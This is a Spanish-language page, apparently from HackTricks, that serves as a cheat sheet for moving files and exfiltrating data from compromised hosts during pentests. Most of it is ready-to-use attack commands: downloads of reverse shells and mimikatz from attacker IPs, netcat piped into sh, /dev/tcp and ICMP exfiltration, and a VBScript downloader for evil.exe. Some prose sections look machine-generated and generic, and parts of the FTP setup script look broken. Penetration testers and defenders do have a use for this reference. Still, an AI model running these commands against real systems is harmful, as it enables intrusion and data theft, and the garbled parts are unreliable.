## Exfiltración

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Consejo de bug bounty**: **regístrate** en **Intigriti**, una plataforma premium de **bug bounty creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Copiar y pegar en Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Subir archivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimiendo GET y POSTs (también cabeceras)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo de Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

---

#### **Description**

A HTTPS server is a server that uses the HTTPS protocol to encrypt the communication between the server and the client. This protocol is widely used to protect sensitive information such as passwords, credit card numbers, and other personal data.

#### **Exploitation**

If an attacker gains access to a HTTPS server, they can potentially exfiltrate sensitive information by intercepting the encrypted traffic. This can be done by using a man-in-the-middle attack or by compromising the server itself.

#### **Mitigation**

To prevent exfiltration through a HTTPS server, it is important to ensure that the server is properly secured. This includes using strong encryption algorithms, keeping software up-to-date, and implementing proper access controls. Additionally, monitoring network traffic for suspicious activity can help detect and prevent exfiltration attempts.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

#### Introducción

En este apartado se explicará cómo configurar un servidor FTP en NodeJS para exfiltrar datos.

#### Configuración

Para configurar el servidor FTP, se debe instalar el paquete `ftp-srv` de NodeJS:

```
npm install ftp-srv
```

Luego, se debe crear un archivo `server.js` con el siguiente contenido:

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://0.0.0.0:21',
  pasv_url: 'ftp://0.0.0.0:3000',
  greeting: 'Welcome to my FTP server',
  anonymous: true,
  file_format: 'ls',
});

ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
  console.log(`User ${username} logged in`);
  resolve({root: '/'});
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server listening');
  });
```

Este archivo crea un servidor FTP que escucha en el puerto 21 y utiliza el puerto 3000 para conexiones pasivas. Además, permite conexiones anónimas y muestra un mensaje de bienvenida personalizado.

#### Uso

Para utilizar el servidor FTP, se debe ejecutar el archivo `server.js` con NodeJS:

```
node server.js
```

Luego, se puede conectar al servidor FTP utilizando cualquier cliente FTP, como `ftp` en Linux o FileZilla en Windows. La dirección IP del servidor FTP es la dirección IP de la máquina en la que se está ejecutando el servidor.

Una vez conectado al servidor FTP, se pueden subir y descargar archivos como en cualquier otro servidor FTP.

#### Conclusión

El servidor FTP en NodeJS es una herramienta útil para exfiltrar datos de forma sencilla y rápida. Sin embargo, se debe tener en cuenta que el servidor FTP no es seguro y que los datos transferidos pueden ser interceptados por terceros. Por lo tanto, se recomienda utilizar esta herramienta solo en entornos controlados y seguros.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Cliente **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali como servidor
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
O crear un recurso compartido smb **usando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltración de datos en Windows

## Introducción

La exfiltración de datos es el proceso de robo y transferencia de datos de un sistema comprometido a un sistema controlado por el atacante. En este documento se describen algunas técnicas comunes de exfiltración de datos en sistemas Windows.

## Técnicas de exfiltración de datos

### Correo electrónico

El correo electrónico es una forma común de exfiltración de datos. Los atacantes pueden enviar correos electrónicos con archivos adjuntos que contienen datos robados. También pueden utilizar servicios de correo electrónico en línea para enviar datos a través de la web.

### FTP

FTP es un protocolo de transferencia de archivos que se utiliza comúnmente para la exfiltración de datos. Los atacantes pueden utilizar clientes FTP para transferir datos a un servidor controlado por el atacante.

### HTTP/HTTPS

Los atacantes pueden utilizar el protocolo HTTP/HTTPS para exfiltrar datos. Pueden utilizar herramientas como cURL o Wget para enviar datos a un servidor controlado por el atacante.

### DNS

El protocolo DNS se utiliza comúnmente para resolver nombres de dominio en direcciones IP. Los atacantes pueden utilizar consultas DNS para exfiltrar datos. Pueden utilizar herramientas como DnsCat2 para enviar datos a través de consultas DNS.

### SMB

SMB es un protocolo utilizado para compartir archivos e impresoras en redes Windows. Los atacantes pueden utilizar SMB para exfiltrar datos. Pueden utilizar herramientas como Impacket para transferir archivos a través de SMB.

### Dispositivos USB

Los atacantes pueden utilizar dispositivos USB para exfiltrar datos. Pueden copiar datos en un dispositivo USB y luego llevarlo físicamente fuera del lugar.

## Conclusiones

La exfiltración de datos es una parte importante del proceso de ataque. Los atacantes utilizan una variedad de técnicas para exfiltrar datos de sistemas comprometidos. Es importante que los administradores de sistemas estén al tanto de estas técnicas y tomen medidas para prevenirlas.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

El atacante debe tener SSHd en ejecución.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) es una herramienta de red que se utiliza para leer y escribir datos a través de conexiones de red utilizando TCP o UDP. Es una herramienta muy útil para la exfiltración de datos, ya que permite la transferencia de archivos y la ejecución de comandos en sistemas remotos.

### Ejemplo de uso

Para utilizar NC para la exfiltración de datos, primero debemos establecer una conexión entre el sistema de origen y el sistema de destino. En el sistema de origen, podemos utilizar el siguiente comando para enviar un archivo a través de NC:

```
nc <ip_destino> <puerto_destino> < archivo_a_enviar
```

En el sistema de destino, podemos utilizar el siguiente comando para recibir el archivo:

```
nc -l <puerto_destino> > archivo_recibido
```

También podemos utilizar NC para ejecutar comandos en sistemas remotos. En el sistema de origen, podemos utilizar el siguiente comando para ejecutar un comando en el sistema de destino:

```
echo "<comando_a_ejecutar>" | nc <ip_destino> <puerto_destino>
```

En el sistema de destino, podemos utilizar el siguiente comando para recibir el comando y ejecutarlo:

```
nc -l <puerto_destino> | sh
```

Es importante tener en cuenta que NC no proporciona cifrado de datos, por lo que cualquier información transferida a través de NC puede ser interceptada y leída por terceros. Por lo tanto, se recomienda utilizar NC en combinación con otras herramientas de cifrado, como SSH o SSL, para garantizar la seguridad de los datos transferidos.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Descargar archivo desde la víctima
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Subir archivo a la víctima
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

Gracias a **@BinaryShadow\_**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por defecto en XP y 2003 (en otros sistemas operativos es necesario agregarlo explícitamente durante la instalación)

En Kali, **inicie el servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP en Python:**

```python
import socketserver
import struct

class TFTPServer(socketserver.UDPServer):
    def __init__(self, server_address, RequestHandlerClass):
        socketserver.UDPServer.__init__(self, server_address, RequestHandlerClass)

class TFTPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, socket = self.request
        opcode = struct.unpack("!H", data[:2])[0]
        if opcode == 1:
            filename = data[2:data.index(b'\0', 2)].decode('ascii')
            mode = data[data.index(b'\0', 2)+1:data.index(b'\0', data.index(b'\0', 2)+1)].decode('ascii')
            print("File requested: %s" % filename)
            print("Mode: %s" % mode)
            with open(filename, "rb") as f:
                file_data = f.read()
            block_num = 1
            while True:
                block = file_data[(block_num-1)*512:block_num*512]
                if not block:
                    break
                packet = struct.pack("!H", 3) + struct.pack("!H", block_num) + block
                socket.sendto(packet, self.client_address)
                block_num += 1
        else:
            print("Unknown opcode: %d" % opcode)

if __name__ == "__main__":
    server = TFTPServer(('0.0.0.0', 69), TFTPHandler)
    server.serve_forever()
```

Este es un servidor TFTP escrito en Python. El servidor escucha en todas las interfaces en el puerto 69. Cuando recibe una solicitud de lectura de archivo (opcode 1), lee el archivo solicitado y lo envía al cliente en bloques de 512 bytes.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
En **víctima**, conectarse al servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Descargar un archivo con una línea de código en PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript es un lenguaje de scripting que se utiliza principalmente en sistemas operativos Windows. Es similar a JavaScript y se utiliza para automatizar tareas en el sistema operativo. VBScript se puede utilizar para exfiltrar datos de un sistema comprometido. Algunas técnicas comunes de exfiltración de datos con VBScript incluyen el uso de FTP, correo electrónico y HTTP. También se puede utilizar para crear backdoors y descargar malware en un sistema comprometido.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Víctima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta es una técnica loca que funciona en máquinas Windows de 32 bits. La idea es usar el programa `debug.exe`. Se utiliza para inspeccionar binarios, como un depurador. Pero también puede reconstruirlos a partir de hexadecimales. Entonces, la idea es que tomemos binarios, como `netcat`. Y luego lo desensamblamos en hexadecimales, lo pegamos en un archivo en la máquina comprometida y luego lo ensamblamos con `debug.exe`.

`Debug.exe` solo puede ensamblar 64 kb. Entonces necesitamos usar archivos más pequeños que eso. Podemos usar upx para comprimirlo aún más. Así que hagámoslo:
```
upx -9 nc.exe
```
Ahora solo pesa 29 kb. Perfecto. Ahora vamos a desensamblarlo:
```
wine exe2bat.exe nc.exe nc.txt
```
Ahora simplemente copiamos y pegamos el texto en nuestra shell de Windows. Y automáticamente creará un archivo llamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **regístrese** en **Intigriti**, una plataforma premium de **recompensa por errores creada por hackers, para hackers**! ¡Únase a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comience a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
